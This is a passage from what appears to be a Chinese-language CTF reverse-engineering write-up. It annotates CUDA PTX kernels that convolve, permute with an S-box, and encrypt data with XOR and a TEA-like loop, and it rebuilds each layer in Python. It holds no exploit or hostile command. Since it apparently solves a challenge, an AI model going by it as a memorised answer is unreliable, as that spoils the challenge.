class="hljs-comment">// %r45 = 循环计数器（初始化为 0）</span><br><br>$L__BB2_2: <span class="hljs-comment">// 哈希类循环（迭代 3,238,567 次！）</span><br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>; <span class="hljs-comment">// 编译器提示：不要展开此循环。</span><br>shl.b32 %r26, %r48, <span class="hljs-number">4</span>;      <span class="hljs-comment">// %r26 = %r48 &lt;&lt; 4</span><br>add.s32 %r27, %r26, <span class="hljs-number">1386807340</span>; <span class="hljs-comment">// %r27 = (%r48 &lt;&lt; 4) + constant1</span><br>shr.u32 %r28, %r48, <span class="hljs-number">5</span>;      <span class="hljs-comment">// %r28 = %r48 &gt;&gt; 5</span><br>add.s32 %r29, %r28, <span class="hljs-number">2007053320</span>; <span class="hljs-comment">// %r29 = (%r48 &gt;&gt; 5) + constant2</span><br><span class="hljs-keyword">xor</span>.b32 %r30, %r29, %r27;   <span class="hljs-comment">// %r30 = %r29 XOR %r27</span><br>add.s32 %r31, %r48, %r46;   <span class="hljs-comment">// %r31 = %r48 + %r46</span><br><span class="hljs-keyword">xor</span>.b32 %r32, %r30, %r31;   <span class="hljs-comment">// %r32 = %r30 XOR %r31</span><br>add.s32 %r47, %r32, %r47;   <span class="hljs-comment">// %r47 = %r32 + %r47 (更新第一个状态变量)</span><br><br>shl.b32 %r33, %r47, <span class="hljs-number">4</span>;      <span class="hljs-comment">// %r33 = %r47 &lt;&lt; 4</span><br>add.s32 %r34, %r33, <span class="hljs-number">621668851</span>;  <span class="hljs-comment">// %r34 = (%r47 &lt;&lt; 4) + constant3</span><br>add.s32 %r35, %r46, %r47;   <span class="hljs-comment">// %r35 = %r46 + %r47</span><br><span class="hljs-keyword">xor</span>.b32 %r36, %r34, %r35;   <span class="hljs-comment">// %r36 = %r34 XOR %r35</span><br>shr.u32 %r37, %r47, <span class="hljs-number">5</span>;      <span class="hljs-comment">// %r37 = %r47 &gt;&gt; 5</span><br>add.s32 %r38, %r37, <span class="hljs-number">-862448841</span>; <span class="hljs-comment">// %r38 = (%r47 &gt;&gt; 5) + constant4</span><br><span class="hljs-keyword">xor</span>.b32 %r39, %r36, %r38;   <span class="hljs-comment">// %r39 = %r36 XOR %r38</span><br>sub.s32 %r48, %r48, %r39;   <span class="hljs-comment">// %r48 = %r48 - %r39 (更新第二个状态变量)</span><br><br>add.s32 %r46, %r46, <span class="hljs-number">-1708609273</span>; <span class="hljs-comment">// 更新下一个迭代的常量</span><br>add.s32 %r45, %r45, <span class="hljs-number">1</span>;      <span class="hljs-comment">// 递增循环计数器</span><br>setp.ne.s32 %p2, %r45, <span class="hljs-number">3238567</span>; <span class="hljs-comment">// %p2 = 如果 loop_counter != 3238567，则为真</span><br>@%p2 bra $L__BB2_2;         <span class="hljs-comment">// 如果 %p2 为真，继续哈希循环</span><br><br>st.global.u32 [%rd3], %r48;     <span class="hljs-comment">// 将更新后的第一个 32 位字存储回全局内存</span><br>st.global.u32 [%rd3<span class="hljs-number">+4</span>], %r47;   <span class="hljs-comment">// 将更新后的第二个 32 位字存储回全局内存</span><br><br>$L__BB2_4: <span class="hljs-comment">// 哈希计算或跳过后的通用路径</span><br>bar.sync <span class="hljs-number">0</span>; <span class="hljs-comment">// 同步块内的所有线程。在下一次读/写之前是必需的。</span><br><br><span class="hljs-comment">// 第二次 XOR 操作（与第一次类似）</span><br><span class="hljs-keyword">and</span>.b16 %rs16, %rs9, %rs8; <span class="hljs-comment">// %rs16 = (block_id.x AND thread_id.x) (16 位)</span><br>ld.global.u8 %rs17, [%rd3]; <span class="hljs-comment">// 从 %rd3 的全局内存加载 1 字节到 %rs17</span><br><span class="hljs-keyword">xor</span>.b16 %rs18, %rs17, %rs16; <span class="hljs-comment">// %rs18 = loaded_byte XOR (%rs16)</span><br>st.global.u8 [%rd3], %rs18; <span class="hljs-comment">// 将结果存储回相同的全局内存位置 (%rd3)</span><br><br>bar.sync <span class="hljs-number">0</span>; <span class="hljs-comment">// 同步块内的所有线程。</span><br><br><span class="hljs-comment">// T 盒和 S 盒查找与累积乘法</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd7, %r3;    <span class="hljs-comment">// 将 thread_id.x 转换为 64 位以作为 S 盒索引</span><br>mov.u64 %rd8, cuda_sbox;  <span class="hljs-comment">// %rd8 = cuda_sbox 的基地址</span><br>add.s64 %rd9, %rd8, %rd7; <span class="hljs-comment">// %rd9 = cuda_sbox_base + thread_id.x</span><br>ld.<span class="hljs-type">const</span>.u8 %rs31, [%rd9]; <span class="hljs-comment">// 从 cuda_sbox 中以 thread_id.x 为索引加载 1 字节到 %rs31 (这是一个运行中的“状态”值)</span><br><br>cvta.to.global.u64 %rd4, %rd5; <span class="hljs-comment">// 将 output_ptr (第二个参数) 转换为全局内存地址</span><br>mov.u16 %rs32, <span class="hljs-number">0</span>;         <span class="hljs-comment">// %rs32 = 16 位和的累加器（初始化为 0）</span><br>mov.u32 %r50, <span class="hljs-number">0</span>;          <span class="hljs-comment">// %r50 = 循环计数器（初始化为 0）</span><br>mov.u64 %rd14, cuda_tbox; <span class="hljs-comment">// %rd14 = cuda_tbox 的基地址</span><br><br>$L__BB2_5: <span class="hljs-comment">// T 盒/S 盒乘法循环（迭代 256 次）</span><br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>; <span class="hljs-comment">// 编译器提示：不要展开此循环。</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd10, %r49;   <span class="hljs-comment">// 将 block_base_offset (%r49 = block_id.x * num_threads_per_block.x) 转换为 64 位</span><br>add.s64 %rd11, %rd2, %rd10; <span class="hljs-comment">// %rd11 = global_input_output_ptr + block_base_offset。这似乎在访问跨块的数据。</span><br>cvt.u<span class="hljs-number">64.</span>u16 %rd12, %rs31;  <span class="hljs-comment">// 将当前 S 盒状态 (%rs31) 转换为 64 位</span><br><span class="hljs-keyword">and</span>.b64 %rd13, %rd12, <span class="hljs-number">255</span>; <span class="hljs-comment">// 掩码 %rd12 以获取低 8 位 (T 盒索引的 0-255 范围)</span><br>add.s64 %rd15, %rd14, %rd13; <span class="hljs-comment">// %rd15 = cuda_tbox_base + (S-box_state &amp; 0xFF)。T 盒查找的地址。</span><br>ld.<span class="hljs-type">const</span>.u8 %rs19, [%rd15]; <span class="hljs-comment">// 从 cuda_tbox 加载 1 字节到 %rs19 (T 盒值)</span><br><br>ld.global.u8 %rs20, [%rd11]; <span class="hljs-comment">// 从 %rd11 的全局内存加载 1 字节 (似乎是块共享输入)</span><br>mul.lo.s16 %rs21, %rs19, %rs20; <span class="hljs-comment">// %rs21 = T-box_value * loaded_byte (乘法，低 16 位)</span><br>add.s16 %rs32, %rs21, %rs32; <span class="hljs-comment">// %rs32 = %rs21 + %rs32 (累积乘积)</span><br><br>mul.lo.s16 %rs22, %rs31, <span class="hljs-number">5</span>; <span class="hljs-comment">// %rs22 = current_sbox_state * 5</span><br>add.s16 %rs31, %rs22, <span class="hljs-number">17</span>;   <span class="hljs-comment">// %rs31 = %rs22 + 17 (更新 S 盒状态以进行下一次迭代)</span><br><br>add.s32 %r49, %r49, <span class="hljs-number">1</span>;     <span class="hljs-comment">// 递增 %r49 (这意味着读取地址 %rd11 也递增)</span><br>add.s32 %r50, %r50, <span class="hljs-number">1</span>;     <span class="hljs-comment">// 递增循环计数器</span><br>setp.ne.s32 %p3, %r50, <span class="hljs-number">256</span>; <span class="hljs-comment">// %p3 = 如果 loop_counter != 256，则为真</span><br>@%p3 bra $L__BB2_5;        <span class="hljs-comment">// 如果 %p3 为真，继续 T 盒/S 盒循环</span><br><br><span class="hljs-comment">// 基于累积值的最终转换</span><br><span class="hljs-keyword">xor</span>.b32 %r18, %r1, %r3; <span class="hljs-comment">// %r18 = block_id.x XOR thread_id.x</span><br>mov.u32 %r51, <span class="hljs-number">8</span>;        <span class="hljs-comment">// %r51 = 计数器，初始化为 8</span><br><br>$L__BB2_7: <span class="hljs-comment">// 最终置换/替换循环（迭代 4,137,815 次！）</span><br>.pragma <span class="hljs-string">&quot;nounroll&quot;</span>; <span class="hljs-comment">// 编译器提示：不要展开此循环。</span><br>shl.b16 %rs23, %rs32, <span class="hljs-number">3</span>;   <span class="hljs-comment">// %rs23 = accumulated_value &lt;&lt; 3</span><br><span class="hljs-keyword">and</span>.b16 %rs24, %rs32, <span class="hljs-number">224</span>; <span class="hljs-comment">// %rs24 = accumulated_value AND 224 (0b11100000)</span><br>shr.u16 %rs25, %rs24, <span class="hljs-number">5</span>;   <span class="hljs-comment">// %rs25 = %rs24 &gt;&gt; 5</span><br><span class="hljs-keyword">or</span>.b16 %rs26, %rs25, %rs23; <span class="hljs-comment">// %rs26 = %rs25 OR %rs23 (对 %rs32 的旋转类操作)</span><br>cvt.u<span class="hljs-number">32.</span>u16 %r42, %rs26;   <span class="hljs-comment">// 将 %rs26 转换为 32 位</span><br>mad.lo.s32 %r43, %r42, <span class="hljs-number">13</span>, %r18; <span class="hljs-comment">// %r43 = %r42 * 13 + (%r18)</span><br><span class="hljs-keyword">and</span>.b32 %r44, %r51, <span class="hljs-number">255</span>;   <span class="hljs-comment">// %r44 = counter AND 255 (使用计数器的低 8 位作为索引)</span><br>cvt.u<span class="hljs-number">64.</span>u32 %rd16, %r44;   <span class="hljs-comment">// 转换为 64 位</span><br>add.s64 %rd18, %rd14, %rd16; <span class="hljs-comment">// %rd18 = cuda_tbox_base + (counter &amp; 0xFF)。T 盒查找的地址。</span><br>cvt.u<span class="hljs-number">16.</span>u32 %rs27, %r43;   <span class="hljs-comment">// 将 %r43 转换为 16 位</span><br>ld.<span class="hljs-type">const</span>.u8 %rs28, [%rd18]; <span class="hljs-comment">// 从 cuda_tbox 加载 1 字节到 %rs28</span><br><span class="hljs-keyword">xor</span>.b16 %rs29, %rs28, %rs27; <span class="hljs-comment">// %rs29 = loaded_T-box_value XOR %rs27</span><br><br>cvt.u<span class="hljs-number">64.</span>u16 %rd19, %rs29;  <span class="hljs-comment">// 将 %rs29 转换为 64 位</span><br><span class="hljs-keyword">and</span>.b64 %rd20, %rd19, <span class="hljs-number">255</span>; <span class="hljs-comment">// 掩码 %rd19 以获取低 8 位 (S 盒索引的 0-255 范围)</span><br>add.s64 %rd22, %rd8, %rd20; <span class="hljs-comment">// %rd22 = cuda_sbox_base + (%rs29 &amp; 0xFF)。S 盒查找的地址。</span><br>ld.<span class="hljs-type">const</span>.u8 %rs32, [%rd22]; <span class="hljs-comment">// 从 cuda_sbox 加载 1 字节到 %rs32 (这是此迭代的最终输出字节)</span><br><br>add.s32 %r51, %r51, <span class="hljs-number">1</span>;     <span class="hljs-comment">// 递增计数器</span><br>setp.ne.s32 %p4, %r51, <span class="hljs-number">4137823</span>; <span class="hljs-comment">// %p4 = 如果 counter != 4137823，则为真</span><br>@%p4 bra $L__BB2_7;        <span class="hljs-comment">// 如果 %p4 为真，继续最终循环</span><br><br>add.s64 %rd23, %rd4, %rd1; <span class="hljs-comment">// %rd23 = global_output_ptr (第二个参数) + global_thread_index。最终输出地址。</span><br>st.global.u8 [%rd23], %rs32; <span class="hljs-comment">// 将最终转换后的字节 (%rs32) 存储到全局输出内存。</span><br>ret; <span class="hljs-comment">// 从内核返回。</span><br>&#125;<br></code></pre></td></tr></table></figure><p>分析推导<br><strong>Layer1</strong>:二维卷积操作</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ld.param.u<span class="hljs-number">64</span> <span class="hljs-variable">%rd5</span><span class="hljs-punctuation">,</span> [_Z<span class="hljs-number">6</span>Layer<span class="hljs-number">1</span>PhS__param_<span class="hljs-number">0</span>]<span class="hljs-comment">;  // 输入指针</span><br>ld.param.u<span class="hljs-number">64</span> <span class="hljs-variable">%rd6</span><span class="hljs-punctuation">,</span> [_Z<span class="hljs-number">6</span>Layer<span class="hljs-number">1</span>PhS__param_<span class="hljs-number">1</span>]<span class="hljs-comment">;  // 输出指针</span><br>setp.lt.u<span class="hljs-number">32</span> <span class="hljs-variable">%p1</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">241</span><span class="hljs-comment">;  // 检查threadIdx.x &lt; 241</span><br>setp.lt.u<span class="hljs-number">32</span> <span class="hljs-variable">%p2</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">241</span><span class="hljs-comment">;  // 检查blockIdx.x &lt; 241</span><br></code></pre></td></tr></table></figure><p>边界检查，只处理前 241x241 的网格</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs mel">mov.f32 %f10, <span class="hljs-number">0</span>f00000000;   <span class="hljs-comment">// 累加器初始化为0.0</span><br>mov.u64 %rd8, cuda_motion;  <span class="hljs-comment">// 加载motion矩阵地址</span><br><br>$L__BB0_3:  <span class="hljs-comment">// 外层循环 (i=0-15)</span><br>add.s32 %r13, %r20, %r2;    <span class="hljs-comment">// bid + i</span><br>shl.b32 %r14, %r20, <span class="hljs-number">4</span>;      <span class="hljs-comment">// i*16</span><br>sub.s32 %r16, %r15, %r14;   <span class="hljs-comment">// 240 - i*16 → motion起始索引</span><br><br>$L__BB0_4:  <span class="hljs-comment">// 内层循环 (j=0-15)</span><br>ld.<span class="hljs-keyword">global</span>.u8 %rs1, [%rd10];  <span class="hljs-comment">// 加载输入字节</span><br>cvt.rn.f32.u16 %f7, %rs1;   <span class="hljs-comment">// 字节转浮点</span><br>ld.const.f32 %f8, [%rd14];  <span class="hljs-comment">// 加载motion权重</span><br>fma.rn.f32 %f10, %f8, %f7, %f10;  <span class="hljs-comment">// 乘加累加</span><br>cvt.rzi.u32.f32 %r17, %f10;  <span class="hljs-comment">// 浮点转整数(截断)</span><br>st.<span class="hljs-keyword">global</span>.u8 [%rd13], %r17;  <span class="hljs-comment">// 存储结果字节</span><br></code></pre></td></tr></table></figure><p>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">layer1</span>(<span class="hljs-params">input_data</span>):<br>    block_dim = <span class="hljs-number">256</span><br>    output = [<span class="hljs-number">0</span>] * (<span class="hljs-number">256</span> * <span class="hljs-number">256</span>)<br>    <br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">241</span>):  <span class="hljs-comment"># 块索引限制</span><br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">241</span>):  <span class="hljs-comment"># 线程索引限制</span><br>            total = <span class="hljs-number">0.0</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):  <span class="hljs-comment"># 外层循环</span><br>                motion_idx = <span class="hljs-number">240</span> - i * <span class="hljs-number">16</span><br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):  <span class="hljs-comment"># 内层循环</span><br>                    input_idx = (bid + i) * block_dim + (tid + j)<br>                    total += cuda_motion[motion_idx + j] * input_data[input_idx]<br>            <br>            output[bid * block_dim + tid] = <span class="hljs-built_in">int</span>(total) &amp; <span class="hljs-number">0xFF</span><br>    <br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p><strong>Layer2</strong>: 置换操作，使用 sbox 对每个像素的位置进行重新排列</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mad.lo.s<span class="hljs-number">32</span> <span class="hljs-variable">%r4</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r1</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r2</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r3</span><span class="hljs-comment">;  // 计算输入索引: blockIdx.x*blockDim.x + threadIdx.x</span><br>ld.<span class="hljs-keyword">global</span>.u<span class="hljs-number">8</span> <span class="hljs-variable">%rs1</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd6</span>]<span class="hljs-comment">;       // 加载输入字节</span><br><br>ld.const.u<span class="hljs-number">8</span> <span class="hljs-variable">%r5</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd9</span>]<span class="hljs-comment">;  // sbox[threadIdx.x]</span><br>ld.const.u<span class="hljs-number">8</span> <span class="hljs-variable">%r6</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd11</span>]<span class="hljs-comment">; // sbox[blockIdx.x]</span><br><br>mad.lo.s<span class="hljs-number">32</span> <span class="hljs-variable">%r7</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r2</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r5</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r6</span><span class="hljs-comment">;  // 计算新位置: blockDim.x * sbox[tid] + sbox[bid]</span><br>st.<span class="hljs-keyword">global</span>.u<span class="hljs-number">8</span> [<span class="hljs-variable">%rd13</span>]<span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs1</span><span class="hljs-comment">;      // 存储到新位置</span><br></code></pre></td></tr></table></figure><p>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">layer2</span>(<span class="hljs-params">input_data</span>):<br>    block_dim = <span class="hljs-number">256</span><br>    output = [<span class="hljs-number">0</span>] * (<span class="hljs-number">256</span> * <span class="hljs-number">256</span>)<br>    <br>    <span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            input_idx = bid * block_dim + tid<br>            new_idx = block_dim * cuda_sbox[tid] + cuda_sbox[bid]<br>            output[new_idx] = input_data[input_idx]<br>    <br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p><strong>Layer3</strong>: 核心加密操作<br>1.初次异或</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">or</span>.b<span class="hljs-number">16</span> <span class="hljs-variable">%rs10</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs9</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs8</span><span class="hljs-comment">;  // bid | tid</span><br><span class="hljs-keyword">xor</span>.b<span class="hljs-number">16</span> <span class="hljs-variable">%rs12</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs11</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs10</span><span class="hljs-comment">;  // buffer ^= (bid | tid)</span><br>st.<span class="hljs-keyword">global</span>.u<span class="hljs-number">8</span> [<span class="hljs-variable">%rd3</span>]<span class="hljs-punctuation">,</span> <span class="hljs-variable">%rs12</span><span class="hljs-comment">;</span><br>bar.sync <span class="hljs-number">0</span><span class="hljs-comment">;  // 同步</span><br></code></pre></td></tr></table></figure><p>推导：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        idx = bid * <span class="hljs-number">256</span> + tid<br>        buffer[idx] ^= bid | tid<br></code></pre></td></tr></table></figure><p>2.类似 TEA 的加密</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">and</span>.b<span class="hljs-number">32</span> <span class="hljs-variable">%r23</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r3</span><span class="hljs-punctuation">,</span> <span class="hljs-number">7</span><span class="hljs-comment">;      // tid &amp; 7</span><br>setp.<span class="hljs-keyword">ne</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%p1</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r23</span><span class="hljs-punctuation">,</span> <span class="hljs-number">0</span><span class="hljs-comment">;  // 检查是否执行加密</span><br>@<span class="hljs-variable">%p1</span> bra $L__BB<span class="hljs-number">2</span>_<span class="hljs-number">4</span><span class="hljs-comment">;        // 条件跳转</span><br><br>// 加密核心<br>ld.<span class="hljs-keyword">global</span>.u<span class="hljs-number">32</span> <span class="hljs-variable">%r47</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd3</span><span class="hljs-number">+4</span>]<span class="hljs-comment">;  // 加载高位字</span><br>ld.<span class="hljs-keyword">global</span>.u<span class="hljs-number">32</span> <span class="hljs-variable">%r48</span><span class="hljs-punctuation">,</span> [<span class="hljs-variable">%rd3</span>]<span class="hljs-comment">;    // 加载低位字</span><br>mov.u<span class="hljs-number">32</span> <span class="hljs-variable">%r46</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1786956040</span><span class="hljs-comment">;      // 初始常量</span><br><br>$L__BB<span class="hljs-number">2</span>_<span class="hljs-number">2</span>:  // 加密循环 (<span class="hljs-number">3</span><span class="hljs-punctuation">,</span><span class="hljs-number">238</span><span class="hljs-punctuation">,</span><span class="hljs-number">567</span>轮)<br>// 更新高位字<br><span class="hljs-keyword">shl</span>.b<span class="hljs-number">32</span> <span class="hljs-variable">%r26</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r48</span><span class="hljs-punctuation">,</span> <span class="hljs-number">4</span><span class="hljs-comment">;        // v0 &lt;&lt; 4</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r27</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r26</span><span class="hljs-punctuation">,</span> <span class="hljs-number">1386807340</span><span class="hljs-comment">; </span><br>shr.u<span class="hljs-number">32</span> <span class="hljs-variable">%r28</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r48</span><span class="hljs-punctuation">,</span> <span class="hljs-number">5</span><span class="hljs-comment">;        // v0 &gt;&gt; 5</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r29</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r28</span><span class="hljs-punctuation">,</span> <span class="hljs-number">2007053320</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">xor</span>.b<span class="hljs-number">32</span> <span class="hljs-variable">%r30</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r29</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r27</span><span class="hljs-comment">;     // (v0&gt;&gt;5 + C2) ^ (v0&lt;&lt;4 + C1)</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r31</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r48</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r46</span><span class="hljs-comment">;     // v0 + sum</span><br><span class="hljs-keyword">xor</span>.b<span class="hljs-number">32</span> <span class="hljs-variable">%r32</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r30</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r31</span><span class="hljs-comment">;     // 二次异或</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r47</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r32</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r47</span><span class="hljs-comment">;     // v1 += ...</span><br><br>// 更新低位字<br><span class="hljs-keyword">shl</span>.b<span class="hljs-number">32</span> <span class="hljs-variable">%r33</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r47</span><span class="hljs-punctuation">,</span> <span class="hljs-number">4</span><span class="hljs-comment">;        // v1 &lt;&lt; 4</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r34</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r33</span><span class="hljs-punctuation">,</span> <span class="hljs-number">621668851</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r35</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r46</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r47</span><span class="hljs-comment">;     // sum + v1</span><br><span class="hljs-keyword">xor</span>.b<span class="hljs-number">32</span> <span class="hljs-variable">%r36</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r34</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r35</span><span class="hljs-comment">;     // (v1&lt;&lt;4 + C3) ^ (sum+v1)</span><br>shr.u<span class="hljs-number">32</span> <span class="hljs-variable">%r37</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r47</span><span class="hljs-punctuation">,</span> <span class="hljs-number">5</span><span class="hljs-comment">;        // v1 &gt;&gt; 5</span><br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r38</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r37</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-862448841</span><span class="hljs-comment">;</span><br><span class="hljs-keyword">xor</span>.b<span class="hljs-number">32</span> <span class="hljs-variable">%r39</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r36</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r38</span><span class="hljs-comment">;     // 二次异或</span><br><span class="hljs-keyword">sub</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r48</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r48</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r39</span><span class="hljs-comment">;     // v0 -= ...</span><br><br>// 更新常量<br><span class="hljs-keyword">add</span>.s<span class="hljs-number">32</span> <span class="hljs-variable">%r46</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%r46</span><span class="hljs-punctuation">,</span> <span class="hljs-number">-1708609273</span><span class="hljs-comment">;  // sum += delta</span><br></code></pre></td></tr></table></figure><p>推导：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">or</span> bid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> tid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">8</span>):<br>        idx = bid * <span class="hljs-number">256</span> + tid<br>        <span class="hljs-comment"># 读取8字节(2个32位字)</span><br>        v0 = <span class="hljs-built_in">int</span>.from_bytes(buffer[idx:idx+<span class="hljs-number">4</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>        v1 = <span class="hljs-built_in">int</span>.from_bytes(buffer[idx+<span 